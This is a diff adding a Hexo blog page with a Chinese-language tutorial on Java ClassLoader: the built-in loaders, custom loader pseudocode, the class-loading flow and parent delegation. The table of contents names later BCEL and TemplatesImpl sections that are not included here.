@@ -1,0 +1,490 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="前言Java是一个依赖于JVM实现的跨平台的开发语言。Java程序在运行前需要先编译成class文件，Java类初始化的时候会调用java.lang.ClassLoader加载类字节码，ClassLoader会调用JVM的native方法来定义一个java.lang.Class实例。 类加载器分类JVM默认类加载器在JVM类加载器中最顶层的是Bootstrap ClassLoader（引导类加载器">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ClassLoader">
+<meta property="og:url" content="https://h3rmesk1t.github.io/2023/04/14/ClassLoader/index.html">
+<meta property="og:site_name" content="H3rmesk1t">
+<meta property="og:description" content="前言Java是一个依赖于JVM实现的跨平台的开发语言。Java程序在运行前需要先编译成class文件，Java类初始化的时候会调用java.lang.ClassLoader加载类字节码，ClassLoader会调用JVM的native方法来定义一个java.lang.Class实例。 类加载器分类JVM默认类加载器在JVM类加载器中最顶层的是Bootstrap ClassLoader（引导类加载器">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2023/04/14/ClassLoader/1708280844219-0d6fcdd5-edc7-4a74-9b4c-9ac023e84d8b.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2023/04/14/ClassLoader/1708347066695-144e68ff-e4cd-40c8-8e60-b62acc0e3a25.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2023/04/14/ClassLoader/1708349177993-0c9042fe-3018-4996-86f8-cb585a502fda.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2023/04/14/ClassLoader/1708350437868-213c189a-6915-4a16-ada3-cc1e4af14cbd.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2023/04/14/ClassLoader/1708350702793-8e3a7547-5323-4685-b71f-a810642f476b.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2023/04/14/ClassLoader/1708351381670-6e7fdb31-97f7-4697-b715-458fca5c4961.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2023/04/14/ClassLoader/1708353018114-0d9f1b98-84f0-4390-b14e-c0a5e4dfd8c2.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2023/04/14/ClassLoader/1708361897796-5fcf8776-46a6-4869-a3dc-57b634525cfc.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2023/04/14/ClassLoader/1708362057937-dd53fa0c-69ad-4e28-820e-7c0f9bfcca9d.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2023/04/14/ClassLoader/1708364858623-13d3a976-4631-44dc-801d-3609f3193ca0.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2023/04/14/ClassLoader/1708366322999-da5160fc-e98e-40c7-a37f-2bd77a58000b.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2023/04/14/ClassLoader/1708366425326-5498f1e8-94af-4600-91ec-9c68249e72c4.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2023/04/14/ClassLoader/1708366907124-0836d695-de67-40f8-9bee-3f39280366ff.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2023/04/14/ClassLoader/1708366858398-3af3671c-0818-4eb3-a47c-475cae281656.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2023/04/14/ClassLoader/1708368360450-078310aa-d7a1-454e-9ef0-64a13270357f.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2023/04/14/ClassLoader/1708368498181-e4900389-7d91-41d9-bd27-58e13afc4b89.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2023/04/14/ClassLoader/1708368655234-f91fbfa9-fab6-4a2f-97e3-17c7fcec11ce.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2023/04/14/ClassLoader/1708368126498-07118fd7-2368-4cb5-a46f-f9dfc17c4dc2.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2023/04/14/ClassLoader/1708587531918-1e4a2c24-9764-4ef4-bc57-733eb017d7a1.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2023/04/14/ClassLoader/1708588090921-df8526bb-38e5-47be-8809-edec2655a873.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2023/04/14/ClassLoader/1708588314594-7b857808-c8b8-4e8c-a1cf-ca52e61814cc.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2023/04/14/ClassLoader/1708590393401-629079d3-cdf7-4b70-b488-36f6f7eb707a.png">
+<meta property="article:published_time" content="2023-04-14T06:52:00.000Z">
+<meta property="article:modified_time" content="2024-12-19T04:19:44.357Z">
+<meta property="article:author" content="H3rmesk1t">
+<meta property="article:tag" content="Java">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://h3rmesk1t.github.io/2023/04/14/ClassLoader/1708280844219-0d6fcdd5-edc7-4a74-9b4c-9ac023e84d8b.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/my-logo-mosaic.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/my-logo-mosaic-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/my-logo-mosaic.png">
+        
+      
+    
+    <!-- title -->
+    <title>ClassLoader</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="H3rmesk1t" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2023/04/22/URLDNS/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/03/23/Java%E5%AD%97%E8%8A%82%E7%A0%81/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://h3rmesk1t.github.io/2023/04/14/ClassLoader/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://h3rmesk1t.github.io/2023/04/14/ClassLoader/&text=ClassLoader"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://h3rmesk1t.github.io/2023/04/14/ClassLoader/&title=ClassLoader"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://h3rmesk1t.github.io/2023/04/14/ClassLoader/&is_video=false&description=ClassLoader"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ClassLoader&body=Check out this article: https://h3rmesk1t.github.io/2023/04/14/ClassLoader/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://h3rmesk1t.github.io/2023/04/14/ClassLoader/&title=ClassLoader"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://h3rmesk1t.github.io/2023/04/14/ClassLoader/&title=ClassLoader"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://h3rmesk1t.github.io/2023/04/14/ClassLoader/&title=ClassLoader"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://h3rmesk1t.github.io/2023/04/14/ClassLoader/&title=ClassLoader"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://h3rmesk1t.github.io/2023/04/14/ClassLoader/&name=ClassLoader&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://h3rmesk1t.github.io/2023/04/14/ClassLoader/&t=ClassLoader"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%B1%BB"><span class="toc-number">2.</span> <span class="toc-text">类加载器分类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JVM%E9%BB%98%E8%AE%A4%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8"><span class="toc-number">2.1.</span> <span class="toc-text">JVM默认类加载器</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#BootstrapClassLoader"><span class="toc-number">2.1.1.</span> <span class="toc-text">BootstrapClassLoader</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ExtensionsClassLoader"><span class="toc-number">2.1.2.</span> <span class="toc-text">ExtensionsClassLoader</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#AppClassLoader"><span class="toc-number">2.1.3.</span> <span class="toc-text">AppClassLoader</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%AA%E5%AE%9A%E4%B9%89%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8"><span class="toc-number">2.2.</span> <span class="toc-text">自定义类加载器</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ClassLoader%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%B5%81%E7%A8%8B"><span class="toc-number">3.</span> <span class="toc-text">ClassLoader类加载流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%9C%BA%E5%88%B6"><span class="toc-number">4.</span> <span class="toc-text">双亲委派机制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81"><span class="toc-number">5.</span> <span class="toc-text">动态加载字节码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#URLClassLoader%E5%8A%A0%E8%BD%BD%E8%BF%9C%E7%A8%8B%E5%AD%97%E8%8A%82%E7%A0%81%E6%96%87%E4%BB%B6"><span class="toc-number">5.1.</span> <span class="toc-text">URLClassLoader加载远程字节码文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ClassLoader%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81"><span class="toc-number">5.2.</span> <span class="toc-text">ClassLoader加载字节码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TemplatesImpl%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81"><span class="toc-number">5.3.</span> <span class="toc-text">TemplatesImpl加载字节码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BCEL-ClassLoader"><span class="toc-number">5.4.</span> <span class="toc-text">BCEL ClassLoader</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#BCEL%E5%85%BC%E5%AE%B9%E6%80%A7%E9%97%AE%E9%A2%98"><span class="toc-number">5.4.1.</span> <span class="toc-text">BCEL兼容性问题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#BCEL%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86"><span class="toc-number">5.4.2.</span> <span class="toc-text">BCEL攻击原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E4%BB%A3%E7%A0%81"><span class="toc-number">5.4.3.</span> <span class="toc-text">测试代码</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        ClassLoader
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">H3rmesk1t</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-04-14T06:52:00.000Z" class="dt-published" itemprop="datePublished">2023-04-14</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/Java/">Java</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Java/" rel="tag">Java</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><font style="color:rgb(51, 51, 51);">Java</font><font style="color:rgb(51, 51, 51);">是一个依赖于</font><font style="color:rgb(51, 51, 51);">JVM</font><font style="color:rgb(51, 51, 51);">实现的跨平台的开发语言。</font><font style="color:rgb(51, 51, 51);">Java</font><font style="color:rgb(51, 51, 51);">程序在运行前需要先编译成</font><font style="color:rgb(51, 51, 51);">class</font><font style="color:rgb(51, 51, 51);">文件，</font><font style="color:rgb(51, 51, 51);">Java</font><font style="color:rgb(51, 51, 51);">类初始化的时候会调用</font><font style="color:rgb(51, 51, 51);">java.lang.ClassLoader</font><font style="color:rgb(51, 51, 51);">加载类字节码，</font><font style="color:rgb(51, 51, 51);">ClassLoader</font><font style="color:rgb(51, 51, 51);">会调用</font><font style="color:rgb(51, 51, 51);">JVM</font><font style="color:rgb(51, 51, 51);">的</font><font style="color:rgb(51, 51, 51);">native</font><font style="color:rgb(51, 51, 51);">方法来定义一个</font><font style="color:rgb(51, 51, 51);">java.lang.Class</font><font style="color:rgb(51, 51, 51);">实例。</font></p>
+<h2 id="类加载器分类"><a href="#类加载器分类" class="headerlink" title="类加载器分类"></a>类加载器分类</h2><h3 id="JVM默认类加载器"><a href="#JVM默认类加载器" class="headerlink" title="JVM默认类加载器"></a>JVM默认类加载器</h3><p><font style="color:rgb(51, 51, 51);">在</font><font style="color:rgb(51, 51, 51);">JVM</font><font style="color:rgb(51, 51, 51);">类加载器中最顶层的是</font>Bootstrap ClassLoader（引导类加载器）<font style="color:rgb(51, 51, 51);">、</font>Extension ClassLoader（扩展类加载器）<font style="color:rgb(51, 51, 51);">和</font>App ClassLoader（系统类加载器）<font style="color:rgb(51, 51, 51);">，</font>AppClassLoader<font style="color:rgb(51, 51, 51);">是默认的类加载器，当不指定类加载器的情况下进行类加载时，默认会使用</font>AppClassLoader<font style="color:rgb(51, 51, 51);">加载类。</font></p>
+<h4 id="BootstrapClassLoader"><a href="#BootstrapClassLoader" class="headerlink" title="BootstrapClassLoader"></a>BootstrapClassLoader</h4><p><font style="color:rgb(51, 51, 51);">引导类加载器</font><font style="color:rgb(51, 51, 51);">BootstrapClassLoader</font><font style="color:rgb(51, 51, 51);">底层原生代码由</font><font style="color:rgb(51, 51, 51);">C++</font><font style="color:rgb(51, 51, 51);">语言进行编写，属于</font><font style="color:rgb(51, 51, 51);">JVM</font><font style="color:rgb(51, 51, 51);">一部分，不继承</font><font style="color:rgb(51, 51, 51);">java.lang.ClassLoader</font><font style="color:rgb(51, 51, 51);">类，也没有父加载器，主要负责加载核心</font><font style="color:rgb(51, 51, 51);">Java</font><font style="color:rgb(51, 51, 51);">库，即</font><font style="color:rgb(51, 51, 51);">JVM</font><font style="color:rgb(51, 51, 51);">本身，存储在</font><font style="color:rgb(51, 51, 51);">&#x2F;jre&#x2F;lib&#x2F;rt.jar</font><font style="color:rgb(51, 51, 51);">目录当中，该目录当中的类都是由</font><font style="color:rgb(51, 51, 51);">BootstrapClassLoader</font><font style="color:rgb(51, 51, 51);">来加载。</font></p>
+<p><font style="color:rgb(51, 51, 51);">同时，为了安全考虑，</font><font style="color:rgb(51, 51, 51);">BootstrapClassLoader</font><font style="color:rgb(51, 51, 51);">只加载包名为</font><font style="color:rgb(51, 51, 51);">java</font><font style="color:rgb(51, 51, 51);">、</font><font style="color:rgb(51, 51, 51);">javax</font><font style="color:rgb(51, 51, 51);">、</font><font style="color:rgb(51, 51, 51);">sun</font><font style="color:rgb(51, 51, 51);">等开头的类。</font></p>
+<h4 id="ExtensionsClassLoader"><a href="#ExtensionsClassLoader" class="headerlink" title="ExtensionsClassLoader"></a>ExtensionsClassLoader</h4><p><font style="color:rgb(51, 51, 51);">扩展类加载器</font><font style="color:rgb(51, 51, 51);">ExtensionsClassLoader</font><font style="color:rgb(51, 51, 51);">由</font><font style="color:rgb(51, 51, 51);">sun.misc.Launcher$ExtClassLoader</font><font style="color:rgb(51, 51, 51);">类实现，用来在</font><font style="color:rgb(51, 51, 51);">&#x2F;jre&#x2F;lib&#x2F;ext</font><font style="color:rgb(51, 51, 51);">或者</font><font style="color:rgb(51, 51, 51);">java.ext.dirs</font><font style="color:rgb(51, 51, 51);">中指明的目录加载</font><font style="color:rgb(51, 51, 51);">Java</font><font style="color:rgb(51, 51, 51);">的扩展库。</font></p>
+<h4 id="AppClassLoader"><a href="#AppClassLoader" class="headerlink" title="AppClassLoader"></a>AppClassLoader</h4><p><font style="color:rgb(51, 51, 51);">系统类加载器</font><font style="color:rgb(51, 51, 51);">AppClassLoader</font><font style="color:rgb(51, 51, 51);">由</font><font style="color:rgb(51, 51, 51);">sun.misc.Launcher$AppClassLoader</font><font style="color:rgb(51, 51, 51);">实现，一般通过</font><font style="color:rgb(51, 51, 51);">java.class.path</font><font style="color:rgb(51, 51, 51);">或者</font><font style="color:rgb(51, 51, 51);">Classpath</font><font style="color:rgb(51, 51, 51);">环境变量来加载</font><font style="color:rgb(51, 51, 51);">Java</font><font style="color:rgb(51, 51, 51);">类。通常使用这个加载类来加载</font><font style="color:rgb(51, 51, 51);">Java</font><font style="color:rgb(51, 51, 51);">应用类，</font><font style="color:rgb(51, 51, 51);">ClassLoader.getSystemClassLoader()</font><font style="color:rgb(51, 51, 51);">返回的系统类加载器也是</font><font style="color:rgb(51, 51, 51);">AppClassLoader</font><font style="color:rgb(51, 51, 51);">。</font></p>
+<h3 id="自定义类加载器"><a href="#自定义类加载器" class="headerlink" title="自定义类加载器"></a>自定义类加载器</h3><p><font style="color:rgb(51, 51, 51);">除了上述</font><font style="color:rgb(51, 51, 51);">Java</font><font style="color:rgb(51, 51, 51);">自带提供的类加载器，还可以通过继承</font><font style="color:rgb(51, 51, 51);">java.lang.ClassLoader</font><font style="color:rgb(51, 51, 51);">类的方式实现自定义类加载器。</font></p>
+<p>在ClassLoader里面有三个重要的方法: loadClass、findClass和defineClass。</p>
+<p>loadClass方法是加载目标类的入口，它首先会查找当前ClassLoader以及它的双亲里面是否已经加载了目标类，如果没有找到就会让双亲尝试加载。当双亲都无法进行加载时，会调用findClass方法让自定义加载器自己来加载目标类，ClassLoader的findClass方法是需要子类来覆盖的，不同的加载器将使用不同的逻辑来获取目标类的字节码，拿到字节码后再调用defineClass方法将字节码转换成Class对象。</p>
+<p>Class.forName和ClassLoader.loadClass都是常见的类动态加载方式，但是它们之间也有着区别。</p>
+<ol>
+<li>那就是Class.forName方法可以获取原生类型的Class，而ClassLoader.loadClass方法则会报错。</li>
+<li><font style="color:rgb(51, 51, 51);">Class.forName</font><font style="color:rgb(51, 51, 51);">方法默认会初始化被加载类的静态属性和方法，如果不希望初始化类可以使用</font><font style="color:rgb(51, 51, 51);">Class.forName(“类名”, 是否初始化类, 类加载器)</font><font style="color:rgb(51, 51, 51);">，而</font><font style="color:rgb(51, 51, 51);">ClassLoader.loadClass</font><font style="color:rgb(51, 51, 51);">默认不会初始化类方法。</font></li>
+</ol>
+<p><font style="color:rgb(51, 51, 51);">自定义加载器实现过程伪代码如下：</font></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 加载入口，定义了双亲委派规则</span></span><br><span class="line">  Class <span class="title function_">loadClass</span><span class="params">(String name)</span> &#123;</span><br><span class="line">    <span class="comment">// 是否已经加载了</span></span><br><span class="line">    <span class="type">Class</span> <span class="variable">t</span> <span class="operator">=</span> <span class="built_in">this</span>.findFromLoaded(name);</span><br><span class="line">    <span class="keyword">if</span>(t == <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="comment">// 交给双亲</span></span><br><span class="line">      t = <span class="built_in">this</span>.parent.loadClass(name)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(t == <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="comment">// 双亲都不行，只能靠自己了</span></span><br><span class="line">      t = <span class="built_in">this</span>.findClass(name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> t;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 交给子类自己去实现</span></span><br><span class="line">  Class <span class="title function_">findClass</span><span class="params">(String name)</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> ClassNotFoundException();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 组装Class对象</span></span><br><span class="line">  Class <span class="title function_">defineClass</span><span class="params">(<span class="type">byte</span>[] code, String name)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> buildClassFromCode(code, name);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CustomClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line"></span><br><span class="line">  Class <span class="title function_">findClass</span><span class="params">(String name)</span> &#123;</span><br><span class="line">    <span class="comment">// 寻找字节码</span></span><br><span class="line">    <span class="type">byte</span>[] code = findCodeFromSomewhere(name);</span><br><span class="line">    <span class="comment">// 组装Class对象</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.defineClass(code, name);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="ClassLoader类加载流程"><a href="#ClassLoader类加载流程" class="headerlink" title="ClassLoader类加载流程"></a>ClassLoader类加载流程</h2><ol>
+<li>首先，ClassLoader<font style="color:rgb(51, 51, 51);">会调用</font><font style="color:#080808;background-color:#ffffff;">loadClass</font><font style="color:rgb(51, 51, 51);">方法加载类</font></li>
+<li><font style="color:rgb(51, 51, 51);">loadClass</font><font style="color:rgb(51, 51, 51);">方法先调用</font>findLoadedClass<font style="color:rgb(51, 51, 51);">方法检查类是否已经初始化，如果</font><font style="color:rgb(51, 51, 51);">JVM</font><font style="color:rgb(51, 51, 51);">已初始化过该类则直接返回类对象</font></li>
+<li><font style="color:rgb(51, 51, 51);">如果创建当前</font>ClassLoader<font style="color:rgb(51, 51, 51);">时传入了父类加载器，就使用父类加载器加载类，否则使用</font>Bootstrap ClassLoader<font style="color:rgb(51, 51, 51);">进行加载</font></li>
+<li><font style="color:rgb(51, 51, 51);">如果上一步无法加载类，那么调用自身的</font>findClass<font style="color:rgb(51, 51, 51);">方法尝试加载类</font></li>
+<li><font style="color:rgb(51, 51, 51);">如果当前的</font>ClassLoader<font style="color:rgb(51, 51, 51);">没有重写了</font>findClass<font style="color:rgb(51, 51, 51);">方法，那么直接返回类加载失败异常；如果当前类重写了</font>findClass<font style="color:rgb(51, 51, 51);">方法并通过传入的类名找到了对应的类字节码，那么调用</font>defineClass<font style="color:rgb(51, 51, 51);">方法去</font><font style="color:rgb(51, 51, 51);">JVM</font><font style="color:rgb(51, 51, 51);">中注册该类</font></li>
+<li><font style="color:rgb(51, 51, 51);">如果调用</font><font style="color:rgb(51, 51, 51);">loadClass</font><font style="color:rgb(51, 51, 51);">的时候传入的</font>resolve<font style="color:rgb(51, 51, 51);">参数为</font><font style="color:rgb(51, 51, 51);">true</font><font style="color:rgb(51, 51, 51);">，那么还需要调用</font>resolveClass<font style="color:rgb(51, 51, 51);">方法链接类，默认为</font><font style="color:rgb(51, 51, 51);">false</font><font style="color:rgb(51, 51, 51);"></font></li>
+<li><font style="color:rgb(51, 51, 51);">最后，返回一个被</font><font style="color:rgb(51, 51, 51);">JVM</font><font style="color:rgb(51, 51, 51);">加载后的</font>java.lang.Class<font style="color:rgb(51, 51, 51);">类对象</font></li>
+</ol>
+<p><img src="/2023/04/14/ClassLoader/1708280844219-0d6fcdd5-edc7-4a74-9b4c-9ac023e84d8b.png"></p>
+<h2 id="双亲委派机制"><a href="#双亲委派机制" class="headerlink" title="双亲委派机制"></a>双亲委派机制</h2><p>由于AppClassLoader只负责加载Classpath下的类库，因此当AppClassLoader遇到没有加载的系统类库时，会将系统类库的加载工作交给BootstrapClassLoader和ExtensionClassLoader，这就是双亲委派。</p>
+<p>在下图中，AppClassLoader在加载一个未知的类名时，并不是立即去搜寻Classpath，它会首先将这个类名称交给ExtensionClassLoader来加载，如果ExtensionClassLoader可以加载，那么AppClassLoader就不会进行加载，否则的话AppClassLoader会搜索Classpath。ExtensionClassLoader在加载一个未知的类名时，也并不是立即搜寻ext路径，它会首先将类名称交给BootstrapClassLoader来加载，如果BootstrapClassLoader可以加载，ExtensionClassLoader也不会对其进行加载，否则的话才会搜索ext路径下的jar包。</p>
+<p><img src="/2023/04/14/ClassLoader/1708347066695-144e68ff-e4cd-40c8-8e60-b62acc0e3a25.png"></p>
+<p>AppClassLoader、ExtensionClassLoader、BootstrapClassLoader三者之间形成了一个级联的父子关系，优先把任务交给其父亲，当其父亲无法完成任务时才会轮到自己，在每个ClassLoader对象的内部都会存在一个parent属性指向自己的父加载器。<br>    还需要注意的一点是，上图中的ExtensionClassLoader的parent指针是画的虚线，这是因为它的parent的值是null，当parent字段是null时，表示它的父加载器是根加载器，当Class对象的classLoader属性值是null时，就表示这个类也是根加载器加载的。</p>
